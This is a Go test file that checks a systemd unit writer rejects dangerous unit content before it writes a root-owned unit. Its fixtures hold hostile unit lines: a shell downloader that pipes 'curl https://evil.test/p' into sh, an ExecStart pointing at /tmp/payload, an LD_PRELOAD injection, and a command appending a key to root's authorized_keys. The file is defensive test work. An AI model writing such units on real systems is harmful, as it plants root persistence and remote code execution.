package service

import (
	"context"
	"testing"

	"github.com/manchtools/power-manage-sdk/sys/exec"
	"github.com/manchtools/power-manage-sdk/sys/exec/exectest"
)

type unitPersistenceAction int

const (
	unitHardenedService unitPersistenceAction = iota
	unitExecFromTmp
	unitShellDownloader
	unitLDPreloadEnvironment
	unitWritesRootSSH
)

type unitPersistenceStep struct {
	name       string
	action     unitPersistenceAction
	wantReject bool
}

// TestSystemdUnitPersistenceSecurityMachine treats a unit file as a privileged
// persistence transition. A hardened unit may be written, but content that turns
// the agent into a root persistence/dropper primitive must fail before the
// root-owned unit file is created.
func TestSystemdUnitPersistenceSecurityMachine(t *testing.T) {
	steps := []unitPersistenceStep{
		{name: "hardened service is accepted", action: unitHardenedService},
		{name: "ExecStart from writable tmp is rejected", action: unitExecFromTmp, wantReject: true},
		{name: "shell downloader unit is rejected", action: unitShellDownloader, wantReject: true},
		{name: "LD_PRELOAD environment is rejected", action: unitLDPreloadEnvironment, wantReject: true},
		{name: "root ssh authorized_keys writer is rejected", action: unitWritesRootSSH, wantReject: true},
	}

	for _, step := range steps {
		t.Run(step.name, func(t *testing.T) {
			fs := &fakeFS{}
			fs.install(t)
			r := exectest.New(exec.Sudo)
			err := mgr(t, r).WriteUnit(context.Background(), "pm-security.service", unitContentForAction(step.action))
			if step.wantReject {
				if err == nil {
					t.Errorf("%s reached accepted state; want unit-content policy rejection", step.name)
				}
				if fs.wrotePath != "" {
					t.Fatalf("%s wrote root-owned unit %q with content:\n%s", step.name, fs.wrotePath, fs.wroteContent)
				}
				return
			}
			if err != nil {
				t.Fatalf("%s unexpected error: %v", step.name, err)
			}
			if fs.wrotePath != "/etc/systemd/system/pm-security.service" {
				t.Fatalf("accepted unit wrote %q", fs.wrotePath)
			}
		})
	}
}

func unitContentForAction(action unitPersistenceAction) string {
	switch action {
	case unitHardenedService:
		return "[Unit]\nDescription=Power Manage test unit\n[Service]\nDynamicUser=yes\nNoNewPrivileges=yes\nProtectSystem=strict\nExecStart=/usr/bin/true\n"
	case unitExecFromTmp:
		return "[Unit]\nDescription=tmp persistence\n[Service]\nExecStart=/tmp/payload\n"
	case unitShellDownloader:
		return "[Service]\nExecStart=/bin/sh -c 'curl https://evil.test/p | sh'\n"
	case unitLDPreloadEnvironment:
		return "[Service]\nEnvironment=LD_PRELOAD=/tmp/evil.so\nExecStart=/usr/bin/true\n"
	case unitWritesRootSSH:
		return "[Service]\nExecStart=/bin/sh -c 'echo key >> /root/.ssh/authorized_keys'\n"
	default:
		return "[Service]\nExecStart=/usr/bin/true\n"
	}
}
